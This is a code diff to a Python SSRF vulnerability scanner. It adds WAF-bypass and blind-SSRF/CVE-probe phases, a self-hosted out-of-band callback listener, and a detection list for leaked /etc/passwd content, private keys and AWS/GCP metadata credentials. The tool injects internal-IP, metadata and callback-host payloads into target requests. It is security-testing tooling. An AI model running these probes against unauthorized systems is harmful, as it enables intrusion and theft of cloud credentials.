@@ -2,8 +2,6 @@
 
 import asyncio
 import base64
-import csv
-import json
 import logging
 import os
 import threading
@@ -24,9 +22,11 @@ from aiohttp import ClientTimeout
 from colorama import Fore
 
 from .banner import printBanner
+from .blindlib import BlindPayloadLibrary
 from .config import Config
 from .models import ScanResult
 from .networking import RequestManager
+from .oob import NullOOB, SelfHostedOOB
 from .payloads import PayloadGenerator, ProtocolHandler
 from .progress import ScanProgress
 from .reporting import Reporter
@@ -34,6 +34,27 @@ from .throttling import ErrorHandler, SmartThrottler
 
 
 class SSRFScanner:
+    # Anchored, high-signal byte sequences that only appear when internal data
+    # is actually exfiltrated. Shared by response-diff analysis and the blind
+    # phase's signature-only detection. Loose substrings (token/secret/AWS/...)
+    # are deliberately avoided - they match ordinary pages and cause noise.
+    SSRF_CONTENT_SIGNATURES = [
+        b'root:x:0:0:',                          # /etc/passwd (Linux)
+        b'root:*:0:0:',                          # /etc/passwd (BSD/macOS)
+        b'<title>Index of',                      # directory listing
+        b'-----BEGIN RSA PRIVATE KEY-----',      # private key
+        b'-----BEGIN PRIVATE KEY-----',          # private key
+        b'-----BEGIN OPENSSH PRIVATE KEY-----',  # OpenSSH private key
+        b'ssh-rsa ',                             # public key material
+        b'security-credentials',                 # AWS IMDS IAM creds path
+        b'"AccessKeyId"',                        # AWS credential document
+        b'"SecretAccessKey"',                    # AWS credential document
+        b'ami-id',                               # AWS EC2 metadata
+        b'instance-identity',                    # AWS EC2 metadata
+        b'computeMetadata',                      # GCP metadata
+        b'Metadata-Flavor',                      # GCP metadata header echo
+    ]
+
     def __init__(self):
         printBanner()
         
@@ -69,6 +90,8 @@ class SSRFScanner:
         self.dns_rebinding = []
         self.crlf_injection = []
         self.scheme_confusion = []
+        self.waf_bypass = []
+        self.blind_lib = None  # BlindPayloadLibrary, loaded in load_all_payloads
         
         # Initialize counters and settings
         self.nrTotUrls = 0
@@ -77,6 +100,14 @@ class SSRFScanner:
         self.backurl = ""
         self.cookies = None
         self.quiet_mode = False
+
+        # Out-of-band (OOB) confirmation. Disabled by default (NullOOB); set up
+        # in run() from the --oob-* CLI options.
+        self.oob = NullOOB()
+        self.oob_mode = 'off'          # 'off' | 'selfhosted'
+        self.oob_listen = '0.0.0.0:8000'
+        self.oob_domain = ''           # public authority with wildcard DNS
+        self.oob_wait = 8              # seconds to wait for late callbacks
         
         # Request tracking
         self.total_requests_attempted = 0
@@ -135,7 +166,8 @@ class SSRFScanner:
             'port_payloads.txt': self.port_payloads,
             'dns_rebinding.txt': self.dns_rebinding,
             'crlf_injection.txt': self.crlf_injection,
-            'scheme_confusion.txt': self.scheme_confusion
+            'scheme_confusion.txt': self.scheme_confusion,
+            'waf_bypass.txt': self.waf_bypass
         }
 
         for filename, payload_list in payload_files.items():
@@ -152,6 +184,14 @@ class SSRFScanner:
                         self.logger.info(f"Loaded {len(payload_list)} payloads from {filename}")
             except Exception as e:
                 self.logger.error(f"Error processing {filename}: {str(e)}")
+
+        # Load the bundled blind-SSRF / CVE-probe template library (JSON).
+        blind_path = os.path.join(payload_dir, "blind-ssrf-payloads.json")
+        try:
+            self.blind_lib = BlindPayloadLibrary(blind_path, logger=self.logger)
+        except Exception as e:
+            self.logger.error(f"Error loading blind payload library: {str(e)}")
+            self.blind_lib = None
 
     async def make_request(self, url, method='GET', headers=None, timeout=None):
         """Async request method with rate limiting and error handling"""
@@ -275,6 +315,21 @@ class SSRFScanner:
             return None
 
 
+    def _ssrf_signature(self, response):
+        """Return the first anchored SSRF content signature found, else None.
+
+        High-confidence, path-independent detection: it only matches when the
+        response body actually contains exfiltrated internal data (credentials,
+        /etc/passwd, cloud-metadata markers, private keys).
+        """
+        if not response:
+            return None
+        content = response.content
+        for indicator in self.SSRF_CONTENT_SIGNATURES:
+            if indicator in content:
+                return indicator.decode('utf-8', errors='ignore')
+        return None
+
     def analyze_response(self, original_response, test_response):
         """Analyze differences between original and test responses with smart detection"""
         if not test_response:
@@ -320,34 +375,11 @@ class SSRFScanner:
                 differences['test_status'] = test_response.status_code
                 return True, differences
         
-        # Look for SSRF indicators in response.
-        #
-        # These are intentionally anchored/high-signal byte sequences. Loose
-        # substrings like b'token', b'secret', b'private' or b'AWS' match huge
-        # numbers of ordinary pages (CSRF tokens, privacy notices, docs) and
-        # produced excessive false positives, so they were replaced with
-        # patterns that only appear when internal data is actually exfiltrated.
-        ssrf_indicators = [
-            b'root:x:0:0:',                          # /etc/passwd (Linux)
-            b'root:*:0:0:',                          # /etc/passwd (BSD/macOS)
-            b'<title>Index of',                      # directory listing
-            b'-----BEGIN RSA PRIVATE KEY-----',      # private key
-            b'-----BEGIN PRIVATE KEY-----',          # private key
-            b'-----BEGIN OPENSSH PRIVATE KEY-----',  # OpenSSH private key
-            b'ssh-rsa ',                             # public key material
-            b'security-credentials',                 # AWS IMDS IAM creds path
-            b'"AccessKeyId"',                        # AWS credential document
-            b'"SecretAccessKey"',                    # AWS credential document
-            b'ami-id',                               # AWS EC2 metadata
-            b'instance-identity',                    # AWS EC2 metadata
-            b'computeMetadata',                      # GCP metadata
-            b'Metadata-Flavor',                      # GCP metadata header echo
-        ]
-        
-        for indicator in ssrf_indicators:
-            if indicator in test_response.content:
-                differences['ssrf_indicator'] = indicator.decode('utf-8', errors='ignore')
-                return True, differences  # Definite hit
+        # Look for anchored SSRF content signatures (shared class constant).
+        signature = self._ssrf_signature(test_response)
+        if signature:
+            differences['ssrf_indicator'] = signature
+            return True, differences  # Definite hit
         
         # Flag if we have significant differences
         significant_diffs = ['status_code_changed', 'significant_size_change', 'unexpected_status', 'ssrf_indicator']
@@ -361,6 +393,34 @@ class SSRFScanner:
                 return False, differences
         
         return has_significant, differences
+
+    def _estimate_requests_per_url(self) -> int:
+        """Best-effort estimate of requests issued per URL across all phases.
+
+        Approximate (dedup and query-param count are not known up front) but it
+        scales with the actual loaded payloads/phases, unlike the old hardcoded
+        constant. Used only to drive the progress percentage.
+        """
+        h = max(len(self.headers), 1)
+        li = len(self.local_ips)
+        li5 = min(li, 5)
+        li3 = min(li, 3)
+        est = 0
+        est += h * li * 12                                   # Local IP (variations+encodings)
+        est += h * len(self.cloud_metadata) * 6              # Cloud Metadata (encodings)
+        est += h * len(self.protocols) * li5 * 6             # Protocol
+        est += h * len(self.encoded_payloads) * 5            # Encoded
+        est += len(self.parameter_payloads)                  # Parameter
+        est += h * len(self.port_payloads) * li5             # Port Scan
+        est += h * len(self.dns_rebinding)                   # DNS Rebinding
+        est += h * len(self.crlf_injection) * li3 * 2        # CRLF Injection
+        est += h * (len(self.scheme_confusion) + len(self.protocols) * li5)  # Scheme Confusion
+        est += h * max(len(self.waf_bypass), 1)              # WAF Bypass (roughly, deduped)
+        if self.blind_lib:                                   # Blind SSRF
+            est += 16 if not self._has_callback_target() else self.blind_lib.count()
+        if self._has_callback_target():                      # Remote
+            est += h * 10
+        return max(est, 1)
 
     def print_progress(self):
         """Print scan progress with phase information and percentages"""
@@ -386,10 +446,11 @@ class SSRFScanner:
             if elapsed > 0:
                 req_per_sec = self.total_requests_succeeded / elapsed
         
-        # Calculate actual progress based on requests (more accurate than weighted phases)
-        estimated_total_requests = 28300  # Approximate total for all phases
-        actual_progress = (self.total_requests_attempted / estimated_total_requests * 100) if estimated_total_requests > 0 else 0
-        actual_progress = min(actual_progress, 100)
+        # Progress based on an estimate derived from the loaded payloads and
+        # active phases (computed once in run()); far more accurate than the
+        # old hardcoded constant now that phases/payloads have changed.
+        estimated_total = getattr(self, 'estimated_total_requests', 0) or 1
+        actual_progress = min(self.total_requests_attempted / estimated_total * 100, 100)
         
         # Print progress information with request stats
         print(f"URLs: {self.nrUrlsAnalyzed}/{self.nrTotUrls} | "
@@ -580,11 +641,13 @@ class SSRFScanner:
         
         tasks = []
         for param in self.parameter_payloads:
-            if '?' in url:
-                test_url = f"{url}&{param}"
-            else:
-                test_url = f"{url}?{param}"
-            
+            # Payload lines carry their own leading '?' by convention. Strip it
+            # so we don't emit malformed URLs like 'host??url=...' (or a param
+            # literally named '?url' when the base URL already has a query).
+            clean_param = param.lstrip('?&')
+            separator = '&' if '?' in url else '?'
+            test_url = f"{url}{separator}{clean_param}"
+
             tasks.append(self.make_request(test_url))
         
         responses = await asyncio.gather(*tasks, return_exceptions=True)
@@ -610,6 +673,25 @@ class SSRFScanner:
                     )
                     self.log_vulnerability(result)
 
+    def _oob_enabled(self) -> bool:
+        """True when an out-of-band listener is active."""
+        return getattr(self, 'oob', None) is not None and self.oob.enabled
+
+    def _callback(self, attack_type: str, payload: str, target_url: str) -> str:
+        """Return a callback authority to embed in a payload.
+
+        When OOB is active this mints a unique, correlatable per-payload
+        authority (``<token>.<domain>``). Otherwise it falls back to the static
+        --backurl so existing manual (Burp Collaborator) workflows are unchanged.
+        """
+        if self._oob_enabled():
+            return self.oob.new_callback(attack_type, payload, target_url)
+        return self.backurl
+
+    def _has_callback_target(self) -> bool:
+        """Whether any callback destination is configured (OOB or --backurl)."""
+        return self._oob_enabled() or bool(self.backurl)
+
     async def parameterCallbackAttack(self, url, original_response):
         """
         For URLs that already have query parameters, replace each parameter's value
@@ -624,48 +706,42 @@ class SSRFScanner:
         # Original query params as list of (name, value) pairs
         query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
 
-        # Build callback-style payloads:
-        #  - Variations based on self.backurl (if provided)
-        #  - DNS rebinding payloads (with <BURP-COLLABORATOR> replaced when possible)
-        callback_payloads = []
-
-        # backurl-based variations (same idea as remoteAttack)
-        if self.backurl:
-            callback_payloads.extend([
-                self.backurl,
-                f"http://{self.backurl}",
-                f"https://{self.backurl}",
-                f"{self.backurl}/ssrf-test",
-                f"{self.backurl}?callback=true",
-                f"http://{self.backurl}:80",
-                f"http://{self.backurl}:443",
-                f"http://{self.backurl}:8080",
-                quote(f"http://{self.backurl}"),
-                quote(quote(f"http://{self.backurl}")),
-            ])
-
-        # DNS rebinding payloads (same semantics as dnsRebindingAttack)
-        for dns in self.dns_rebinding:
-            payload = dns
-            if '<BURP-COLLABORATOR>' in dns and self.backurl:
-                payload = dns.replace('<BURP-COLLABORATOR>', self.backurl)
-            callback_payloads.append(payload)
-
-        # Deduplicate while preserving order
-        callback_payloads = list(dict.fromkeys(callback_payloads))
-
-        if not callback_payloads:
-            # Nothing to inject
+        if not self._has_callback_target():
+            # No callback destination (neither OOB nor --backurl); nothing to do.
             return
 
-        total_tests = len(query_pairs) * len(callback_payloads)
-        completed_tests = 0
+        def _callback_payloads_for(cb):
+            """Build callback-style payload variations for a given authority."""
+            payloads = [
+                cb,
+                f"http://{cb}",
+                f"https://{cb}",
+                f"{cb}/ssrf-test",
+                f"{cb}?callback=true",
+                f"http://{cb}:80",
+                f"http://{cb}:443",
+                f"http://{cb}:8080",
+                quote(f"http://{cb}"),
+                quote(quote(f"http://{cb}")),
+            ]
+            # DNS rebinding payloads (same semantics as dnsRebindingAttack)
+            for dns in self.dns_rebinding:
+                payload = dns
+                if '<BURP-COLLABORATOR>' in dns:
+                    payload = dns.replace('<BURP-COLLABORATOR>', cb)
+                payloads.append(payload)
+            return list(dict.fromkeys(payloads))
 
         tasks = []
         meta = []  # (param_name, payload, test_url)
+        total_tests = 0
 
-        # For each parameter, create variants where its value is replaced
+        # For each parameter, mint its own callback so an OOB hit identifies the
+        # exact parameter that is the SSRF sink.
         for idx, (name, value) in enumerate(query_pairs):
+            cb = self._callback('ParameterCallback', f'param={name}', url)
+            callback_payloads = _callback_payloads_for(cb)
+            total_tests += len(callback_payloads)
             for payload in callback_payloads:
                 # Create a new list of query params with this one modified
                 new_pairs = [
@@ -744,11 +820,13 @@ class SSRFScanner:
         
         tasks = []
         for header in self.headers:
+            # One callback authority per header for OOB attribution.
+            cb = self._callback('DNSRebinding', f'header={header}', url) if self._has_callback_target() else ''
             for dns in self.dns_rebinding:
                 payload = dns
-                if '<BURP-COLLABORATOR>' in dns and self.backurl:
-                    payload = dns.replace('<BURP-COLLABORATOR>', self.backurl)
-                
+                if '<BURP-COLLABORATOR>' in dns and cb:
+                    payload = dns.replace('<BURP-COLLABORATOR>', cb)
+
                 badHeader = {header: payload}
                 tasks.append(self.perform_attack(url, 'DNSRebinding', payload, badHeader, original_response))
         
@@ -763,31 +841,32 @@ class SSRFScanner:
 
     async def remoteAttack(self, url, original_response):
         """Perform remote SSRF attack using callback URL"""
-        if not self.backurl:
+        if not self._has_callback_target():
             return
-        
-        # Generate various callback URL formats
-        callback_variations = [
-            self.backurl,
-            f"http://{self.backurl}",
-            f"https://{self.backurl}",
-            f"{self.backurl}/ssrf-test",
-            f"{self.backurl}?callback=true",
-            f"http://{self.backurl}:80",
-            f"http://{self.backurl}:443",
-            f"http://{self.backurl}:8080",
-            quote(f"http://{self.backurl}"),
-            quote(quote(f"http://{self.backurl}")),
-        ]
-        
-        total_tests = len(self.headers) * len(callback_variations)
-        completed_tests = 0
-        
+
         tasks = []
+        # Mint one callback authority per header so an out-of-band hit pinpoints
+        # which header is the SSRF vector.
         for header in self.headers:
+            cb = self._callback('Remote', f'header={header}', url)
+            callback_variations = [
+                cb,
+                f"http://{cb}",
+                f"https://{cb}",
+                f"{cb}/ssrf-test",
+                f"{cb}?callback=true",
+                f"http://{cb}:80",
+                f"http://{cb}:443",
+                f"http://{cb}:8080",
+                quote(f"http://{cb}"),
+                quote(quote(f"http://{cb}")),
+            ]
             for callback in callback_variations:
                 badHeader = {header: callback}
                 tasks.append(self.perform_attack(url, 'Remote', callback, badHeader, original_response))
+
+        total_tests = len(tasks)
+        completed_tests = 0
         
         results = await asyncio.gather(*tasks, return_exceptions=True)
         
@@ -858,6 +937,131 @@ class SSRFScanner:
             completed_tests += 1
             if completed_tests % 50 == 0:
                 self.update_progress('Scheme Confusion', completed_tests, total_tests)
+
+    async def wafBypassAttack(self, url, original_response):
+        """Perform WAF/filter bypass attack using payloads/waf_bypass.txt.
+
+        Entries are filter-evasion primitives: encoded schemes, case
+        variations, protocol confusion, null bytes and traversal. Each is
+        injected as a header value. Prefix-style entries that end in a scheme
+        separator (e.g. 'http://', 'http:\\\\') are also combined with a few
+        local IPs so they resolve to an actual internal target.
+        """
+        if not self.waf_bypass:
+            return
+
+        separators = ('/', ':', '\\', '\uff0f')  # incl. unicode full-width slash
+        payloads = []
+        for entry in self.waf_bypass:
+            payloads.append(entry)
+            # If it looks like a bare scheme/prefix, attach internal targets.
+            if entry.endswith(separators):
+                for ip in self.local_ips[:5]:
+                    payloads.append(f"{entry}{ip}")
+        payloads = self._unique(payloads)
+
+        total_tests = len(self.headers) * len(payloads)
+        completed_tests = 0
+
+        tasks = []
+        for header in self.headers:
+            for payload in payloads:
+                badHeader = {header: payload}
+                tasks.append(self.perform_attack(url, 'WAF_Bypass', payload, badHeader, original_response))
+
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        for result in results:
+            if isinstance(result, ScanResult) and result.is_vulnerable:
+                self.log_vulnerability(result)
+            completed_tests += 1
+            if completed_tests % 50 == 0:
+                self.update_progress('WAF Bypass', completed_tests, total_tests)
+
+    async def blindSsrfAttack(self, url, original_response):
+        """Blind-SSRF / known-CVE probe phase using the bundled template library
+        (payloads/blind-ssrf-payloads.json, from errorfiathck/ssrf-exploit).
+
+        Routing by template shape:
+          - "url"     -> request the rendered CVE-probe URL directly against the
+                         target (e.g. Weblogic/Solr/Jenkins/Confluence probes).
+          - "gopher"/"smuggle" -> inject the rendered SSRF target string into an
+                         appended 'url=' parameter (best generic fetch vector).
+
+        Canary ({canary_addr}) is filled from --backurl. Templates that require a
+        canary are skipped when no --backurl is set, since they can only be
+        confirmed out-of-band. NOTE: blind payloads truly need OOB (interactsh/
+        Collaborator) confirmation; here we fall back to baseline/response-diff,
+        which reliably catches the direct-URL CVE probes but not pure-blind hits.
+        """
+        if not self.blind_lib or self.blind_lib.count() == 0:
+            return
+
+        static_canary = self.backurl or ''
+        oob_active = self._oob_enabled()
+
+        tasks = []
+        meta = []  # (category, name, request_url)
+        for category, name, template, kind, needs_canary in self.blind_lib.iter_templates(include_smuggle=True):
+            if needs_canary:
+                if not self._has_callback_target():
+                    # OOB-only payload with no callback configured; can't confirm.
+                    continue
+                # Mint a unique canary per payload so a callback identifies the
+                # exact CVE/template that fired.
+                canary = self._callback(f'Blind:{category}', name, url) if oob_active else static_canary
+            else:
+                canary = static_canary
+
+            value = self.blind_lib.render_one(template, url, canary=canary)
+
+            if kind == 'url':
+                request_url = value
+            else:
+                separator = '&' if '?' in url else '?'
+                request_url = f"{url}{separator}url={quote(value, safe='')}"
+            tasks.append(self.make_request(request_url))
+            meta.append((category, name, request_url))
+
+        if not tasks:
+            return
+
+        total_tests = len(tasks)
+        completed_tests = 0
+
+        responses = await asyncio.gather(*tasks, return_exceptions=True)
+
+        for (category, name, request_url), response in zip(meta, responses):
+            completed_tests += 1
+            if completed_tests % 25 == 0:
+                self.update_progress('Blind SSRF', completed_tests, total_tests)
+
+            if not response or isinstance(response, Exception):
+                continue
+
+            # These probes deliberately hit different paths / inject nested
+            # targets, so generic status/size diffing vs the baseline would
+            # false-positive constantly. Confirmation for this phase comes from
+            # out-of-band callbacks (reported in _finalize_oob); the in-band
+            # signal here is limited to a concrete content signature (leaked
+            # credentials, /etc/passwd, metadata markers).
+            signature = self._ssrf_signature(response)
+            if signature:
+                result = ScanResult(
+                    url=request_url,
+                    attack_type=f"Blind:{category}",
+                    payload=name,
+                    response_code=response.status_code,
+                    response_size=len(response.content),
+                    timestamp=datetime.now(),
+                    headers={},
+                    is_vulnerable=True,
+                    verification_method="Response Content Analysis",
+                    notes=f"content signature: {signature}"
+                )
+                self.log_vulnerability(result)
+                if self.reporter:
+                    self.reporter.add_result(result)
 
     def verify_vulnerability(self, url: str, payload: str, response, original_response=None) -> str:
         """Verify if the potential vulnerability is real"""
@@ -966,59 +1170,6 @@ class SSRFScanner:
             self.logger.warning(f"Verification Method: {verification_name}")
             self.logger.warning("-" * 50)
 
-    def checkIfLogResult(self, original_response, response, tempResponses, logInfo):
-        """Check if response should be logged"""
-        is_different, differences = self.analyze_response(original_response, response)
-        
-        if is_different:
-            response_code = str(response.status_code)
-            response_size = str(len(response.content))
-            
-            if response_code not in tempResponses:
-                tempResponses[response_code] = [response_size]
-                logInfo['ResponseCode'] = response_code
-                logInfo['ResponseSize'] = response_size
-                self.log_result(logInfo)
-            elif response_size not in tempResponses[response_code]:
-                tempResponses[response_code].append(response_size)
-                logInfo['ResponseCode'] = response_code
-                logInfo['ResponseSize'] = response_size
-                self.log_result(logInfo)
-
-    def log_result(self, info):
-        """Log scan results to files"""
-        with self.file_lock:
-            # Write to CSV
-            with open(self.csv_output, 'a', newline='') as f:
-                writer = csv.DictWriter(f, fieldnames=info.keys())
-                if f.tell() == 0:
-                    writer.writeheader()
-                writer.writerow(info)
-            
-            # Write to JSON
-            results = []
-            if os.path.exists(self.json_output):
-                with open(self.json_output, 'r') as f:
-                    try:
-                        results = json.load(f)
-                    except json.JSONDecodeError:
-                        results = []
-            
-            results.append(info)
-            with open(self.json_output, 'w') as f:
-                json.dump(results, f, indent=2)
-            
-            # Write to TXT
-            with open(self.txt_output, 'a') as f:
-                f.write(f"\nPotential SSRF Found!\n")
-                f.write(f"URL: {info['Hostname']}\n")
-                f.write(f"Attack Type: {info['AttackType']}\n")
-                f.write(f"Header: {info['HeaderField']}\n")
-                f.write(f"Payload: {info['HeaderValue']}\n")
-                f.write(f"Response Code: {info['ResponseCode']}\n")
-                f.write(f"Response Size: {info['ResponseSize']}\n")
-                f.write("-" * 50 + "\n")
-
     async def performAllAttack(self, url, baseline=None):
         """Perform all SSRF attacks"""
         if not self.quiet_mode:
@@ -1090,9 +1241,21 @@ class SSRFScanner:
                 await self.schemeConfusionAttack(url, original_response)
             except Exception as e:
                 self.logger.error(f"Error in Scheme Confusion attack: {str(e)}")
+
+            try:
+                self.progress.current_phase = "WAF Bypass"
+                await self.wafBypassAttack(url, original_response)
+            except Exception as e:
+                self.logger.error(f"Error in WAF Bypass attack: {str(e)}")
+
+            try:
+                self.progress.current_phase = "Blind SSRF"
+                await self.blindSsrfAttack(url, original_response)
+            except Exception as e:
+                self.logger.error(f"Error in Blind SSRF attack: {str(e)}")
             
-            # Only run remote attack if backurl is provided
-            if self.backurl:
+            # Run remote attack when a callback destination exists (OOB or --backurl)
+            if self._has_callback_target():
                 try:
                     self.progress.current_phase = "Remote"
                     await self.remoteAttack(url, original_response)
@@ -1178,6 +1341,85 @@ class SSRFScanner:
                 for reason, count in sorted(self.failure_reasons.items(), key=lambda x: x[1], reverse=True)[:5]:
                     print(f"  {reason}: {count:,}")
 
+    async def _setup_oob(self):
+        """Create and start the OOB provider based on --oob-* options."""
+        if self.oob_mode != 'selfhosted':
+            self.oob = NullOOB()
+            return
+
+        if not self.oob_domain:
+            self.logger.error(
+                "OOB mode 'selfhosted' requires --oob-domain (a public authority "
+                "with wildcard DNS pointing at the listener). OOB disabled."
+            )
+            self.oob = NullOOB()
+            return
+
+        host, _, port = self.oob_listen.partition(':')
+        host = host or '0.0.0.0'
+        try:
+            port = int(port) if port else 8000
+        except ValueError:
+            port = 8000
+
+        provider = SelfHostedOOB(host, port, self.oob_domain, logger=self.logger)
+        started = await provider.start()
+        if started:
+            self.oob = provider
+            if not self.quiet_mode:
+                print(Fore.YELLOW + (
+                    "[!] OOB listener is UNAUTHENTICATED and accepts inbound "
+                    f"connections on {host}:{port}. It only logs requests."
+                ))
+        else:
+            self.oob = NullOOB()
+
+    async def _finalize_oob(self):
+        """Wait for late callbacks, correlate them, and report confirmed hits."""
+        if not self._oob_enabled():
+            return
+
+        wait = max(0, int(self.oob_wait))
+        if wait and not self.quiet_mode:
+            print(f"\n[*] Waiting {wait}s for out-of-band callbacks...")
+        if wait:
+            await asyncio.sleep(wait)
+
+        interactions = self.oob.collect()
+        confirmed_tokens = set()
+        confirmed = 0
+        for it in interactions:
+            meta = self.oob.meta_for(it.token)
+            if not meta or it.token in confirmed_tokens:
+                continue
+            confirmed_tokens.add(it.token)
+            confirmed += 1
+            result = ScanResult(
+                url=meta.target_url,
+                attack_type=f"OOB:{meta.attack_type}",
+                payload=meta.payload,
+                response_code=0,
+                response_size=0,
+                timestamp=datetime.now(),
+                headers={},
+                is_vulnerable=True,
+                verification_method="OOB Interaction",
+                notes=(f"Confirmed out-of-band {it.protocol} callback from "
+                       f"{it.remote_addr} ({it.method} {it.path}) at "
+                       f"{datetime.fromtimestamp(it.timestamp).isoformat()}"),
+            )
+            self.log_vulnerability(result)
+            if self.reporter:
+                self.reporter.add_result(result)
+
+        if not self.quiet_mode:
+            if confirmed:
+                print(Fore.GREEN + f"[+] {confirmed} CONFIRMED out-of-band SSRF "
+                      f"interaction(s) - see report for attribution.")
+            else:
+                print(f"[*] No out-of-band callbacks received "
+                      f"({len(interactions)} unmatched hits).")
+
     async def run(self, urls=None, url_file=None):
         """Run the SSRF scanner"""
         url_list = []
@@ -1212,16 +1454,27 @@ class SSRFScanner:
         
         # Create session
         await self.request_manager.create_session()
-        
+
+        # Set up out-of-band (OOB) confirmation listener if requested.
+        await self._setup_oob()
+
+        # Estimate total requests (per URL x number of URLs) for the progress %.
+        self.estimated_total_requests = self._estimate_requests_per_url() * max(len(url_list), 1)
+
         # Print configuration
         if not self.quiet_mode:
             print(f"\n[*] Configuration:")
-            print(f"    Concurrency: {self.config.scanner['concurrency']}")
+            _conc = self.config.scanner['concurrency']
+            _lph = self.config.scanner.get('limit_per_host', 0) or _conc
+            print(f"    Concurrency: {_conc} (per-host: {_lph})")
             print(f"    Rate Limit: {self.config.rate_limiting['requests_per_second']} req/s")
             print(f"    Timeout: {self.config.scanner['timeout']}s")
             print(f"    Output Format: {self.config.output['format']}")
             if self.config.scanner.get('proxy'):
                 print(f"    Proxy: {self.config.scanner['proxy']}")
+            if self._oob_enabled():
+                print(f"    OOB Mode: {self.oob_mode} (listen {self.oob_listen}, "
+                      f"domain {self.oob_domain})")
             print()
         
         # Start timing
@@ -1231,10 +1484,19 @@ class SSRFScanner:
             # Process all URLs concurrently
             tasks = [self.scan_url(url) for url in url_list]
             await asyncio.gather(*tasks, return_exceptions=True)
+
+            # Wait for (and collect) any out-of-band callbacks, then report them.
+            await self._finalize_oob()
         finally:
             # Close session
             await self.request_manager.close_session()
-            
+
+            # Stop the OOB listener if running
+            try:
+                await self.oob.stop()
+            except Exception:
+                pass
+
             # Calculate total scan time
             if self.scan_start_time:
                 scan_duration = time.time() - self.scan_start_time
